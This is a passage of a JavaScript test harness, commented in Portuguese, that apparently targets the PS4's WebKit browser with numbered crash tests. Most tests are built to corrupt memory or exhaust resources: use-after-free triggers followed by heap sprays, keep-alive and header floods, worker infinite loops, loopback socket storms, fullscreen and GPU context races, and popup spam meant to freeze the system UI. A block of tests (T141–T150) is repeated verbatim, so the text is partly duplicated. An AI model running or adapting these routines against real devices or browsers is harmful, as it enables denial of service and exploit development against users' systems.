            log(">> T130: Frame reload cycles: " + count);
        }
    };
    f.src = "about:blank";
}
function runTest131() {
    log("Iniciando T131: History State Cyclic Bomb...");
    var a = [];
    var b = {};
    for(var i=0; i<500; i++) {
        var o = {id: i, data: new Uint8Array(255).fill(i)}; 
        a.push(o);
        if(i % 50 === 0) b["k"+i] = a; 
    }
    a.push(b); 
    
    try {
        // Serialização profunda do WebKit tenta processar ciclos ou falha
        // Tamanhos ajustados para causar pressão no buffer de IPC
        history.pushState(a, "Title", "?len=" + a.length);
        log(">> T131: State pushed (Serialization heavy).");
        
        // Substituição rápida para forçar free() no objeto anterior
        setTimeout(function() {
            history.replaceState(null, null, null);
            var spray = new ArrayBuffer(1024 * 1024);
        }, 10);
    } catch(e) { log(">> T131 Serialization Error: " + e.message); }
}

function runTest132() {
    log("Iniciando T132: Message Channel Port Clone Loop...");
    var channel = new MessageChannel();
    var p1 = channel.port1;
    var p2 = channel.port2;
    var transferList = [];
    
    try {
        for(var i=0; i<100; i++) {
            var mc = new MessageChannel();
            transferList.push(mc.port1);
            transferList.push(mc.port2);
        }
        
        // Envia centenas de portas através de um único canal
        // O Kernel precisa duplicar os descritores de arquivo (file descriptors) para todas elas
        p1.postMessage("clone_attack", transferList);
        
        p2.onmessage = function(e) {
            var ports = e.ports;
            // Fecha metade e mantém metade para fragmentar a tabela de handles
            for(var j=0; j<ports.length; j+=2) {
                ports[j].close();
            }
            log(".. Ports processed: " + ports.length);
        };
        log(">> T132: Port bombing sent.");
    } catch(e) { log(">> T132 Kernel Limit: " + e.message); }
}

function runTest133() {
    log("Iniciando T133: Node Filter Re-entrancy Trap...");
    var d = document.createElement('div');
    d.innerHTML = "<span>A</span><b>B</b>".repeat(200);
    
    var ni = document.createNodeIterator(d, NodeFilter.SHOW_ELEMENT, {
        acceptNode: function(node) {
            if(node.tagName === 'B') {
                // Modifica o DOM durante a iteração do filtro
                // Isso é um vetor clássico de UAF em motores antigos
                d.innerHTML = ""; 
                var junk = document.createElement('img'); // Tenta ocupar memória liberada
                return NodeFilter.FILTER_ACCEPT;
            }
            return NodeFilter.FILTER_SKIP;
        }
    });
    
    try {
        while(ni.nextNode()) {} 
        log(">> T133: Iterator logic survived.");
    } catch(e) { log(">> T133 Crash Logic: " + e.message); }
}

function runTest134() {
    log("Iniciando T134: DOM Implementation Prototype Spray...");
    var proto = DOMImplementation.prototype;
    var originals = {};
    var props = ["createDocument", "createHTMLDocument", "createDocumentType"];
    
    try {
        // Hook nas funções nativas para inserir alocações
        props.forEach(function(p) {
            originals[p] = proto[p];
            proto[p] = function() {
                var arr = new Array(100);
                for(var i=0; i<100; i++) arr[i] = document.createTextNode("spray");
                return originals[p].apply(this, arguments);
            };
        });
        
        for(var i=0; i<500; i++) {
            document.implementation.createHTMLDocument("test" + i);
        }
        log(">> T134: Prototype hooks executed.");
    } catch(e) { log(">> T134 Erro: " + e.message); }
    
    // Restaura para não quebrar o log
    props.forEach(function(p) { proto[p] = originals[p]; });
}

function runTest135() {
    log("Iniciando T135: Text Encoder Stream Fragmentation...");
    var enc = new TextEncoder();
    var huge = "X".repeat(1024 * 1024);
    var store = [];
    
    try {
        for(var i=0; i<50; i++) {
            // Encode em pedaços grandes força alocações de buffer no heap do WebKit
            var u8 = enc.encode(huge);
            // Cria "fatias" (views) que apontam para o buffer original
            for(var j=0; j<10; j++) {
                store.push(u8.subarray(j*1000, (j+1)*1000));
            }
            // Dereferencia o buffer principal, mas mantém as views
            // O GC não pode liberar o buffer grande enquanto houver views
            u8 = null;
        }
        log(">> T135: Buffer views created: " + store.length);
    } catch(e) { log(">> T135 OOM: " + e.message); }
}

function runTest136() {
    log("Iniciando T136: Fetch API Keep-Alive Flood...");
    var count = 0;
    
    var t = setInterval(function() {
        // fetch com keepalive=true tenta manter a conexão aberta no nível do sistema
        // Enviando payload grande para encher buffers de socket
        var body = new Uint8Array(1024 * 64).fill(0x41);
        fetch("/", {
            method: "POST",
            body: body,
            keepalive: true
        }).catch(e => {});
        
        count++;
        if(count > 1000) {
            clearInterval(t);
            log(">> T136: Keep-alive flood stop.");
        }
    }, 5);
}

function runTest137() {
    log("Iniciando T137: Blob Slice Memory Mapping Fail...");
    var parts = [];
    for(var i=0; i<1000; i++) parts.push("part"+i);
    var b = new Blob(parts); // Blob fragmentado
    
    try {
        var slices = [];
        for(var j=0; j<5000; j++) {
            // Fatias pequenas e aleatórias
            var start = Math.floor(Math.random() * b.size);
            var end = start + 10;
            slices.push(b.slice(start, end));
        }
        
        // Tenta ler todas as fatias simultaneamente
        var fr = new FileReader();
        fr.readAsArrayBuffer(slices[slices.length-1]); 
        
        log(">> T137: Blob mapping table stressed.");
    } catch(e) { log(">> T137 Kernel Map Error: " + e.message); }
}

function runTest138() {
    log("Iniciando T138: Sync XHR Recursive Open...");
    var depth = 0;
    
    function recurse() {
        depth++;
        if(depth > 100) return;
        
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "/", false); // Sync
        xhr.onreadystatechange = function() {
            if(xhr.readyState === 4) {
                recurse(); // Recursão dentro do callback sync
            }
        };
        try { xhr.send(); } catch(e){}
    }
    
    try {
        recurse();
        log(">> T138: Sync recursion depth: " + depth);
    } catch(e) { log(">> T138 Stack/Net Error: " + e.message); }
}

function runTest139() {
    log("Iniciando T139: Worker Import Scripts DoS...");
    var scriptURL = URL.createObjectURL(new Blob(["while(1){}"], {type: 'application/javascript'}));
    var workers = [];
    
    try {
        for(var i=0; i<20; i++) {
            var b = new Blob([
                "try { importScripts('" + scriptURL + "'); } catch(e) {}"
            ], {type: 'application/javascript'});
            
            var w = new Worker(URL.createObjectURL(b));
            workers.push(w);
        }
        
        setTimeout(function() {
            workers.forEach(w => w.terminate());
            log(">> T139: ImportScripts load stop.");
        }, 3000);
        log(">> T139: Workers importing loops launched.");
    } catch(e) { log(">> T139 Error: " + e.message); }
}

function runTest140() {
    log("Iniciando T140: Iframe Src Javascript URI Loop...");
    var container = document.createElement('div');
    document.body.appendChild(container);
    var frames = [];
    
    var t = setInterval(function() {
        var f = document.createElement('iframe');
        // Javascript URI que cria um loop de navegação dentro do frame
        f.src = "javascript:window.location.reload()";
        container.appendChild(f);
        frames.push(f);
        
        if(frames.length > 50) {
            var dead = frames.shift();
            dead.src = "about:blank"; // Tenta cancelar navegação pendente
            container.removeChild(dead);
        }
        
        if(frames.length > 200) {
            clearInterval(t);
            log(">> T140: URI Loop cycle finished.");
        }
    }, 50);
}
function runTest141() {
    log("Iniciando T141: Custom Element Upgrade Race...");
    if(!window.customElements) { log(">> T141: API N/A, Fallback Mutation"); return; }
    
    class XCrusher extends HTMLElement {
        connectedCallback() {
            this.innerHTML = "A".repeat(1000);
            document.body.removeChild(this); 
            var spray = new Uint8Array(1000).fill(0x41);
        }
    }
    
    var container = document.createElement('div');
    document.body.appendChild(container);
    
    try {
        for(var i=0; i<500; i++) {
            var el = document.createElement('x-crusher');
            container.appendChild(el); 
        }
        
        customElements.define('x-crusher', XCrusher);
        
        for(var j=0; j<100; j++) {
            var el = document.createElement('x-crusher');
            container.appendChild(el);
        }
        log(">> T141: Element upgrades triggered.");
    } catch(e) { log(">> T141 Erro: " + e.message); }
}

function runTest142() {
    log("Iniciando T142: Readable Stream Tearing...");
    if(!window.ReadableStream) { log(">> T142: Stream API N/A"); return; }
    
    var buf = new Uint8Array(1024*1024);
    var stream = new ReadableStream({
        start(controller) {
            for(var i=0; i<100; i++) controller.enqueue(buf);
            controller.close();
        }
    });
    
    var reader = stream.getReader();
    var readLoop = function() {
        reader.read().then(function(res) {
            if(!res.done) {
                // Tenta cancelar enquanto lê
                if(Math.random() > 0.8) reader.cancel("Force Quit");
                readLoop();
            } else {
                log(">> T142: Stream read finish.");
            }
        }).catch(function(e) {
            var spray = new ArrayBuffer(0x10000); 
        });
    };
    readLoop();
}

function runTest143() {
    log("Iniciando T143: Shadow DOM Event Retargeting...");
    var host = document.createElement('div');
    if(!host.attachShadow) { log(">> T143: Shadow DOM N/A"); return; }
    
    var root = host.attachShadow({mode: 'open'});
    document.body.appendChild(host);
    
    var child = document.createElement('div');
    root.appendChild(child);
    
    var count = 0;
    host.addEventListener('test', function(e) {
        count++;
        // Modifica a estrutura do Shadow DOM durante o bubbling
        if(count % 2 === 0) {
            root.innerHTML = "";
            var junk = new Float64Array(1000);
        }
    });
    
    for(var i=0; i<1000; i++) {
        child.dispatchEvent(new Event('test', {bubbles: true, composed: true}));
        if(i % 100 === 0) root.appendChild(child); 
    }
    document.body.removeChild(host);
    log(">> T143: Event retargeting stress.");
}

function runTest144() {
    log("Iniciando T144: Proxy Revoke During Iteration...");
    var target = {};
    for(var i=0; i<5000; i++) target["p"+i] = i;
    
    var p = Proxy.revocable(target, {
        get: function(t, k) { return t[k]; }
    });
    
    try {
        var keys = Object.keys(p.proxy);
        keys.forEach(function(k, idx) {
            if(idx === 2500) {
                p.revoke(); 
                var fill = new Array(1000).fill(1); 
            }
            var val = p.proxy[k]; 
        });
    } catch(e) {
        log(">> T144 Proxy Error: " + e.message);
    }
}

function runTest145() {
    log("Iniciando T145: HTML Option Collection Setter...");
    var s = document.createElement('select');
    var opts = s.options;
    
    try {
        for(var i=0; i<1000; i++) {
            opts[i] = new Option("Opt" + i);
        }
        
        // Atribuição de length força realocação do buffer interno da coleção
        opts.length = 50000;
        
        for(var j=49900; j<50000; j++) {
            opts[j] = new Option("Far" + j);
        }
        
        opts.length = 0; 
        
        // Heap spray imediato
        var spray = [];
        for(var k=0; k<1000; k++) spray.push(new Uint32Array(16).fill(0x11223344));
        
        log(">> T145: Option collection thrashing done.");
    } catch(e) { log(">> T145 Erro: " + e.message); }
}

function runTest146() {
    log("Iniciando T146: FileReader Sync Blob Flood...");
    var readers = [];
    var data = new Uint8Array(1024*512).fill(65);
    
    try {
        for(var i=0; i<100; i++) {
            var b = new Blob([data]);
            var fr = new FileReader();
            // Dispara leitura e armazena referência
            fr.readAsArrayBuffer(b);
            readers.push(fr);
            
            // Sobrescreve referência do blob para forçar GC enquanto IO está pendente
            b = null;
            
            if(i % 20 === 0) {
                var junk = new ArrayBuffer(1024*1024);
            }
        }
        log(">> T146: IO Queue flooded.");
    } catch(e) { log(">> T146 Limit: " + e.message); }
}

function runTest147() {
    log("Iniciando T147: Huge Header XHR Attack...");
    var huge = "H".repeat(1024 * 32); 
    var xhr = new XMLHttpRequest();
    
    try {
        xhr.open("GET", "/", true);
        for(var i=0; i<200; i++) {
            // Tenta estourar o buffer de cabeçalhos HTTP do kernel
            xhr.setRequestHeader("X-Junk-" + i, huge);
        }
        xhr.send();
        log(">> T147: Headers sent. Len: " + (200 * 32) + "KB");
    } catch(e) {
        log(">> T147 Socket Error: " + e.message);
    }
}

function runTest148() {
    log("Iniciando T148: Recursive Blob Construction...");
    var layers = [];
    var base = new Blob(["base"]);
    layers.push(base);
    
    try {
        for(var i=0; i<500; i++) {
            // Blob construtor aceita arrays de blobs
            // Cria uma árvore de referência profunda
            var next = new Blob([layers[layers.length-1], layers[layers.length-1]]);
            layers.push(next);
            
            if(i % 50 === 0) log(".. Blob Depth: " + i);
        }
        
        var reader = new FileReader();
        reader.readAsText(layers[layers.length-1]);
        log(">> T148: Deep blob read triggered.");
    } catch(e) {
        log(">> T148 OOM/Limit: " + e.message);
    }
}

function runTest149() {
    log("Iniciando T149: Loopback Socket Connect Storm...");
    var frames = [];
    var portBase = 8080;
    
    var t = setInterval(function() {
        for(var i=0; i<20; i++) {
            // Cria iframes apontando para portas locais fechadas
            // Isso cria sockets no estado SYN_SENT que o kernel precisa gerenciar
            var f = document.createElement('iframe');
            f.src = "http://127.0.0.1:" + (portBase + i);
            document.body.appendChild(f);
            frames.push(f);
        }
        portBase += 20;
        
        if(frames.length > 500) {
            // Remove do DOM mas o socket pode ficar em TIME_WAIT
            while(frames.length > 0) document.body.removeChild(frames.pop());
        }
        
        if(portBase > 9000) {
            clearInterval(t);
            log(">> T149: Socket connect storm finished.");
        }
    }, 50);
}

function runTest150() {
    log("Iniciando T150: DOM Storage Transaction Lock...");
    localStorage.clear();
    
    // Tenta criar uma condição de corrida no arquivo de backing store do SQLite
    var t = setInterval(function() {
        try {
            var key = "k" + Math.random();
            var val = "v".repeat(1024);
            
            // Escrita Síncrona
            localStorage.setItem(key, val);
            
            // Leitura e remoção imediata
            var check = localStorage.getItem(key);
            localStorage.removeItem(key);
            
            // Dispara evento de storage para listeners (IPC stress)
            if(Math.random() > 0.9) localStorage.clear();
            
        } catch(e) {
            clearInterval(t);
            log(">> T150 IO Error: " + e.message);
        }
    }, 0);
    
    setTimeout(function() {
        clearInterval(t);
        log(">> T150: Storage lock test stop.");
    }, 3000);
}
function runTest141() {
    log("Iniciando T141: Custom Element Upgrade Race...");
    if(!window.customElements) { log(">> T141: API N/A, Fallback Mutation"); return; }
    
    class XCrusher extends HTMLElement {
        connectedCallback() {
            this.innerHTML = "A".repeat(1000);
            document.body.removeChild(this); 
            var spray = new Uint8Array(1000).fill(0x41);
        }
    }
    
    var container = document.createElement('div');
    document.body.appendChild(container);
    
    try {
        for(var i=0; i<500; i++) {
            var el = document.createElement('x-crusher');
            container.appendChild(el); 
        }
        
        customElements.define('x-crusher', XCrusher);
        
        for(var j=0; j<100; j++) {
            var el = document.createElement('x-crusher');
            container.appendChild(el);
        }
        log(">> T141: Element upgrades triggered.");
    } catch(e) { log(">> T141 Erro: " + e.message); }
}

function runTest142() {
    log("Iniciando T142: Readable Stream Tearing...");
    if(!window.ReadableStream) { log(">> T142: Stream API N/A"); return; }
    
    var buf = new Uint8Array(1024*1024);
    var stream = new ReadableStream({
        start(controller) {
            for(var i=0; i<100; i++) controller.enqueue(buf);
            controller.close();
        }
    });
    
    var reader = stream.getReader();
    var readLoop = function() {
        reader.read().then(function(res) {
            if(!res.done) {
                // Tenta cancelar enquanto lê
                if(Math.random() > 0.8) reader.cancel("Force Quit");
                readLoop();
            } else {
                log(">> T142: Stream read finish.");
            }
        }).catch(function(e) {
            var spray = new ArrayBuffer(0x10000); 
        });
    };
    readLoop();
}

function runTest143() {
    log("Iniciando T143: Shadow DOM Event Retargeting...");
    var host = document.createElement('div');
    if(!host.attachShadow) { log(">> T143: Shadow DOM N/A"); return; }
    
    var root = host.attachShadow({mode: 'open'});
    document.body.appendChild(host);
    
    var child = document.createElement('div');
    root.appendChild(child);
    
    var count = 0;
    host.addEventListener('test', function(e) {
        count++;
        // Modifica a estrutura do Shadow DOM durante o bubbling
        if(count % 2 === 0) {
            root.innerHTML = "";
            var junk = new Float64Array(1000);
        }
    });
    
    for(var i=0; i<1000; i++) {
        child.dispatchEvent(new Event('test', {bubbles: true, composed: true}));
        if(i % 100 === 0) root.appendChild(child); 
    }
    document.body.removeChild(host);
    log(">> T143: Event retargeting stress.");
}

function runTest144() {
    log("Iniciando T144: Proxy Revoke During Iteration...");
    var target = {};
    for(var i=0; i<5000; i++) target["p"+i] = i;
    
    var p = Proxy.revocable(target, {
        get: function(t, k) { return t[k]; }
    });
    
    try {
        var keys = Object.keys(p.proxy);
        keys.forEach(function(k, idx) {
            if(idx === 2500) {
                p.revoke(); 
                var fill = new Array(1000).fill(1); 
            }
            var val = p.proxy[k]; 
        });
    } catch(e) {
        log(">> T144 Proxy Error: " + e.message);
    }
}

function runTest145() {
    log("Iniciando T145: HTML Option Collection Setter...");
    var s = document.createElement('select');
    var opts = s.options;
    
    try {
        for(var i=0; i<1000; i++) {
            opts[i] = new Option("Opt" + i);
        }
        
        // Atribuição de length força realocação do buffer interno da coleção
        opts.length = 50000;
        
        for(var j=49900; j<50000; j++) {
            opts[j] = new Option("Far" + j);
        }
        
        opts.length = 0; 
        
        // Heap spray imediato
        var spray = [];
        for(var k=0; k<1000; k++) spray.push(new Uint32Array(16).fill(0x11223344));
        
        log(">> T145: Option collection thrashing done.");
    } catch(e) { log(">> T145 Erro: " + e.message); }
}

function runTest146() {
    log("Iniciando T146: FileReader Sync Blob Flood...");
    var readers = [];
    var data = new Uint8Array(1024*512).fill(65);
    
    try {
        for(var i=0; i<100; i++) {
            var b = new Blob([data]);
            var fr = new FileReader();
            // Dispara leitura e armazena referência
            fr.readAsArrayBuffer(b);
            readers.push(fr);
            
            // Sobrescreve referência do blob para forçar GC enquanto IO está pendente
            b = null;
            
            if(i % 20 === 0) {
                var junk = new ArrayBuffer(1024*1024);
            }
        }
        log(">> T146: IO Queue flooded.");
    } catch(e) { log(">> T146 Limit: " + e.message); }
}

function runTest147() {
    log("Iniciando T147: Huge Header XHR Attack...");
    var huge = "H".repeat(1024 * 32); 
    var xhr = new XMLHttpRequest();
    
    try {
        xhr.open("GET", "/", true);
        for(var i=0; i<200; i++) {
            // Tenta estourar o buffer de cabeçalhos HTTP do kernel
            xhr.setRequestHeader("X-Junk-" + i, huge);
        }
        xhr.send();
        log(">> T147: Headers sent. Len: " + (200 * 32) + "KB");
    } catch(e) {
        log(">> T147 Socket Error: " + e.message);
    }
}

function runTest148() {
    log("Iniciando T148: Recursive Blob Construction...");
    var layers = [];
    var base = new Blob(["base"]);
    layers.push(base);
    
    try {
        for(var i=0; i<500; i++) {
            // Blob construtor aceita arrays de blobs
            // Cria uma árvore de referência profunda
            var next = new Blob([layers[layers.length-1], layers[layers.length-1]]);
            layers.push(next);
            
            if(i % 50 === 0) log(".. Blob Depth: " + i);
        }
        
        var reader = new FileReader();
        reader.readAsText(layers[layers.length-1]);
        log(">> T148: Deep blob read triggered.");
    } catch(e) {
        log(">> T148 OOM/Limit: " + e.message);
    }
}

function runTest149() {
    log("Iniciando T149: Loopback Socket Connect Storm...");
    var frames = [];
    var portBase = 8080;
    
    var t = setInterval(function() {
        for(var i=0; i<20; i++) {
            // Cria iframes apontando para portas locais fechadas
            // Isso cria sockets no estado SYN_SENT que o kernel precisa gerenciar
            var f = document.createElement('iframe');
            f.src = "http://127.0.0.1:" + (portBase + i);
            document.body.appendChild(f);
            frames.push(f);
        }
        portBase += 20;
        
        if(frames.length > 500) {
            // Remove do DOM mas o socket pode ficar em TIME_WAIT
            while(frames.length > 0) document.body.removeChild(frames.pop());
        }
        
        if(portBase > 9000) {
            clearInterval(t);
            log(">> T149: Socket connect storm finished.");
        }
    }, 50);
}

function runTest150() {
    log("Iniciando T150: DOM Storage Transaction Lock...");
    localStorage.clear();
    
    // Tenta criar uma condição de corrida no arquivo de backing store do SQLite
    var t = setInterval(function() {
        try {
            var key = "k" + Math.random();
            var val = "v".repeat(1024);
            
            // Escrita Síncrona
            localStorage.setItem(key, val);
            
            // Leitura e remoção imediata
            var check = localStorage.getItem(key);
            localStorage.removeItem(key);
            
            // Dispara evento de storage para listeners (IPC stress)
            if(Math.random() > 0.9) localStorage.clear();
            
        } catch(e) {
            clearInterval(t);
            log(">> T150 IO Error: " + e.message);
        }
    }, 0);
    
    setTimeout(function() {
        clearInterval(t);
        log(">> T150: Storage lock test stop.");
    }, 3000);
}

// Helper para compatibilidade de prefixos no PS4
function reqFS(el) {
    if(el.requestFullscreen) el.requestFullscreen();
    else if(el.webkitRequestFullscreen) el.webkitRequestFullscreen();
    else if(el.mozRequestFullScreen) el.mozRequestFullScreen();
    else if(el.msRequestFullscreen) el.msRequestFullscreen();
}

function exitFS() {
    if(document.exitFullscreen) document.exitFullscreen();
    else if(document.webkitExitFullscreen) document.webkitExitFullscreen();
}

function runTest151() {
    log("Iniciando T151: Fullscreen Toggle Race...");
    var el = document.createElement('div');
    document.body.appendChild(el);
    el.style.backgroundColor = "red";
    
    var t = setInterval(function() {
        try {
            // Tenta forçar condição de corrida no driver de vídeo
            // alternando estados antes da conclusão da animação
            reqFS(el);
            setTimeout(exitFS, 0); // Sai imediatamente na próxima tick
            
            // Cria lixo no DOM para ocupar thread de UI
            var s = document.createElement('span');
            s.innerHTML = "X";
            el.appendChild(s);
        } catch(e) {}
    }, 100);
    
    setTimeout(function() {
        clearInterval(t);
        document.body.removeChild(el);
        log(">> T151: Toggle race stopped.");
    }, 3000);
}

function runTest152() {
    log("Iniciando T152: Detached Node FS Request...");
    var el = document.createElement('div');
    // Nota: O elemento NÃO está no body (Detached)
    
    try {
        // Tentar FS em nodo desconectado pode causar null deref em WebKits antigos
        reqFS(el);
        
        // Conecta e desconecta rapidamente
        document.body.appendChild(el);
        reqFS(el);
        document.body.removeChild(el);
        
        // Tenta acessar propriedades de layout do nodo desconectado
        var h = el.offsetHeight;
        log(">> T152: Detached logic check passed.");
    } catch(e) {
        log(">> T152 Logic Error: " + e.message);
    }
}

function runTest153() {
    log("Iniciando T153: Iframe FS Removal Trap...");
    var container = document.createElement('div');
    document.body.appendChild(container);
    
    var f = document.createElement('iframe');
    container.appendChild(f);
    
    f.onload = function() {
        try {
            var d = f.contentDocument;
            var div = d.createElement('div');
            d.body.appendChild(div);
            div.style.background = "blue";
            
            // O Iframe pede tela cheia
            if(div.webkitRequestFullscreen) div.webkitRequestFullscreen();
            
            // O Pai remove o Iframe do DOM imediatamente
            // Isso deixa o gerenciador de janela do kernel com uma referência órfã?
            setTimeout(function() {
                if(container.contains(f)) container.removeChild(f);
                var spray = new Uint32Array(0x1000).fill(0xDEAD);
            }, 10);
        } catch(e) {}
    };
}

function runTest154() {
    log("Iniciando T154: Video Source Swap Panic...");
    var v = document.createElement('video');
    document.body.appendChild(v);
    
    reqFS(v);
    
    var t = setInterval(function() {
        // Troca a fonte do vídeo enquanto está em modo tela cheia
        // Pode causar race condition no decodificador de mídia do Kernel
        v.src = "dummy_video_" + Math.random() + ".mp4";
        
        // Aloca buffers de mídia falsos
        var b = new Uint8Array(1024*1024);
    }, 100);
    
    setTimeout(function() {
        clearInterval(t);
        exitFS();
        document.body.removeChild(v);
        log(">> T154: Video swap finished.");
    }, 3000);
}

function runTest155() {
    log("Iniciando T155: Pseudo-class Layout Thrash...");
    var el = document.createElement('div');
    el.className = "fs-thrash";
    el.style.background = "green";
    document.body.appendChild(el);
    
    var count = 0;
    var t = setInterval(function() {
        reqFS(el);
        // O CSS .fs-thrash muda drasticamente o layout quando :fullscreen ativa
        // Forçamos leitura de layout síncrona para estressar o motor
        var x = el.offsetWidth;
        exitFS();
        var y = el.offsetWidth;
        count++;
        
        if(count > 20) {
            clearInterval(t);
            log(">> T155: Layout thrashing done.");
        }
    }, 100);
}

function runTest156() {
    log("Iniciando T156: FS Z-Index Layer Explosion...");
    var el = document.createElement('div');
    document.body.appendChild(el);
    reqFS(el);
    
    try {
        for(var i=0; i<1000; i++) {
            var d = document.createElement('div');
            d.style.position = "absolute";
            d.style.zIndex = i;
            d.style.left = (i % 100) + "px";
            d.style.top = (i % 100) + "px";
            // Opacidade e transforms forçam criação de camadas de composição na GPU
            d.style.opacity = 0.9;
            d.style.transform = "translateZ(0)";
            d.innerHTML = "L" + i;
            el.appendChild(d);
            
            if(i % 100 === 0) log(".. Layers: " + i);
        }
        
        setTimeout(function() {
            el.innerHTML = ""; // Destruição em massa de camadas
            exitFS();
            log(">> T156: GPU Layers flushed.");
        }, 2000);
    } catch(e) { log(">> T156 GPU Error: " + e.message); }
}

function runTest157() {
    log("Iniciando T157: Popup Blocker UI Lock...");
    var el = document.createElement('div');
    document.body.appendChild(el);
    reqFS(el);
    
    // Tenta abrir popups enquanto entra em tela cheia
    // O PS4 tenta mostrar notificações de "Popup Bloqueado" sobre o overlay de tela cheia
    // Isso pode travar a thread de UI do sistema (VSH)
    var spam = setInterval(function() {
        window.open("about:blank", "_blank");
        var x = new ArrayBuffer(100000); // Pressão de memória simultânea
    }, 50);
    
    setTimeout(function() {
        clearInterval(spam);
        exitFS();
        log(">> T157: Popup spam stopped.");
    }, 2000);
}

function runTest158() {
    log("Iniciando T158: Fullscreen Canvas OOM...");
    var c = document.createElement('canvas');
    // Tamanho massivo para forçar VRAM
    c.width = 3840; // 4K largura
    c.height = 2160; // 4K altura
    document.body.appendChild(c);
    
    var ctx = c.getContext('2d');
    ctx.fillStyle = "red";
    ctx.fillRect(0,0,3840,2160);
    
    reqFS(c);
    
    var t = setInterval(function() {
        // Redesenha o canvas inteiro em cada frame em tela cheia
        var r = Math.floor(Math.random() * 255);
        ctx.fillStyle = "rgb("+r+",0,0)";
        ctx.fillRect(0,0,3840,2160);
        
        // Tenta alocar mais memória gráfica
        var imgData = ctx.getImageData(0,0,100,100);
    }, 50);
    
    setTimeout(function() {
        clearInterval(t);
        exitFS();
        log(">> T158: 4K Buffer stress finished.");
    }, 3000);
}

function runTest159() {
    log("Iniciando T159: Screen Orientation Lock DoS...");
    var el = document.createElement('div');
    document.body.appendChild(el);
    reqFS(el);
    
    // Tenta travar a orientação repetidamente (mesmo que PS4 não suporte rotação física, a API pode existir)
    var t = setInterval(function() {
        if(screen.orientation && screen.orientation.lock) {
            screen.orientation.lock('landscape').catch(e=>{});
            screen.orientation.unlock();
            screen.orientation.lock('portrait').catch(e=>{});
        } else {
            // Fallback: Redimensionar janela
            window.resizeTo(Math.random()*1000, Math.random()*1000);
        }
    }, 10);
    
    setTimeout(function() {
        clearInterval(t);
        exitFS();
        log(">> T159: Orientation lock cycle done.");
    }, 2000);
}

function runTest160() {
    log("Iniciando T160: The Blackout (Ctx Switch)...");
    var el = document.createElement('div');
    el.style.background = "black";
    el.style.width = "100%"; el.style.height = "100%";
    document.body.appendChild(el);
    
    var state = false;
    
    // Alterna rapidamente entre Fullscreen e Normal enquanto aloca memória pesada
    // Objetivo: Falha na troca de contexto gráfico (Context Switch)
    var t = setInterval(function() {
        if(!state) {
            reqFS(el);
            state = true;
        } else {
            exitFS();
            state = false;
        }
        
        // Heap spray sincronizado com a troca de tela
        var arr = new Array(1000);
        for(var i=0; i<arr.length; i++) arr[i] = new Uint8Array(4096).fill(0xCC);
        
    }, 200); // Intervalo um pouco maior para permitir a transição iniciar antes de abortar
    
    setTimeout(function() {
        clearInterval(t);
        log(">> T160: Context switch stress stopped.");
    }, 4000);
}
function runTest161() {
    log("Iniciando T161: Pointer Lock Race Condition...");
    var c = document.createElement('canvas');
    c.style.background = "black";
    document.body.appendChild(c);
    
    reqFS(c);
    
    var t = setInterval(function() {
        try {
            // Tenta travar o ponteiro (mouse) e sair da tela cheia simultaneamente
            // Isso confunde o subsistema de entrada sobre quem tem o foco
            if(c.requestPointerLock) c.requestPointerLock();
            else if(c.webkitRequestPointerLock) c.webkitRequestPointerLock();
            
            setTimeout(function() {
                if(document.pointerLockElement === c) document.exitPointerLock();
                exitFS();
            }, 10);
            
            // Recria o elemento para invalidar handles
            if(Math.random() > 0.9) {
                document.body.removeChild(c);
                c = document.createElement('canvas');
                c.style.background = "red";
                document.body.appendChild(c);
                reqFS(c);
            }
        } catch(e) {}
    }, 100);
    
    setTimeout(function() {
        clearInterval(t);
        if(document.body.contains(c)) document.body.removeChild(c);
        log(">> T161: Input race stopped.");
    }, 3000);
}

function runTest162() {
    log("Iniciando T162: Canvas Context Loss Flood...");
    var c = document.createElement('canvas');
    c.width = 1920; c.height = 1080;
    document.body.appendChild(c);
    var ctx = c.getContext('2d');
    
    reqFS(c);
    
    var t = setInterval(function() {
        // Tenta forçar a perda do contexto gráfico redimensionando massivamente
        // enquanto está em modo exclusivo de vídeo
        c.width = (c.width === 10) ? 4096 : 10;
        c.height = (c.height === 10) ? 4096 : 10;
        
        try {
            // Desenha algo pesado
            ctx.fillStyle = "rgba(255,0,0,0.5)";
            ctx.fillRect(0,0, c.width, c.height);
            
            // Simula evento de perda de contexto (Webkit específico)
            var ext = ctx.getExtension('WEBGL_lose_context');
            if(ext) ext.loseContext();
        } catch(e) {}
    }, 50);
    
    setTimeout(function() {
        clearInterval(t);
        exitFS();
        document.body.removeChild(c);
        log(">> T162: GPU Context stress done.");
    }, 3000);
}

function runTest163() {
    log("Iniciando T163: SVG Filter Stack Overflow...");
    var div = document.createElement('div');
    div.style.width = "100%"; div.style.height = "100%";
    div.style.background = "white";
    div.innerHTML = "TEXT".repeat(100);
    document.body.appendChild(div);
    
    var svg = '<svg><filter id="f"><feGaussianBlur stdDeviation="10" /></filter></svg>';
    var s = document.createElement('div');
    s.innerHTML = svg;
    document.body.appendChild(s);
    
    reqFS(div);
    
    var count = 0;
    var t = setInterval(function() {
        // Empilha filtros recursivamente via CSS string
        var f = "url(#f) ";
        div.style.filter = f.repeat(count % 50);
        
        // Rotaciona para forçar recomposição da camada
        div.style.transform = "rotate(" + count + "deg)";
        count++;
        
        if(count > 200) {
            clearInterval(t);
            exitFS();
            document.body.removeChild(div);
            log(">> T163: SVG Filter stack limit tested.");
        }
    }, 20);
}

function runTest164() {
    log("Iniciando T164: Mix-Blend-Mode Composite Kill...");
    var container = document.createElement('div');
    container.style.background = "linear-gradient(red, blue)";
    document.body.appendChild(container);
    reqFS(container);
    
    var modes = ["multiply", "screen", "overlay", "darken", "lighten", "color-dodge", "color-burn", "hard-light", "soft-light", "difference", "exclusion"];
    var els = [];
    
    var t = setInterval(function() {
        var el = document.createElement('div');
        el.style.position = "absolute";
        el.style.width = Math.random() * 100 + "%";
        el.style.height = Math.random() * 100 + "%";
        el.style.background = "rgb("+Math.random()*255+","+Math.random()*255+","+Math.random()*255+")";
        
        // Troca o modo de mistura a cada frame
        el.style.mixBlendMode = modes[Math.floor(Math.random() * modes.length)];
        container.appendChild(el);
        els.push(el);
        
        if(els.length > 50) container.removeChild(els.shift());
        
        if(Math.random() > 0.95) {
            container.style.display = "none"; // Força flush do compositor
            container.offsetHeight;
            container.style.display = "block";
        }
    }, 50);
    
    setTimeout(function() {
        clearInterval(t);
        exitFS();
        document.body.removeChild(container);
        log(">> T164: Compositor stress finished.");
    }, 3000);
}

function runTest165() {
    log("Iniciando T165: CSS 3D Transform Matrix Bomb...");
    var el = document.createElement('div');
    el.innerHTML = "3D";
    el.style.fontSize = "100px";
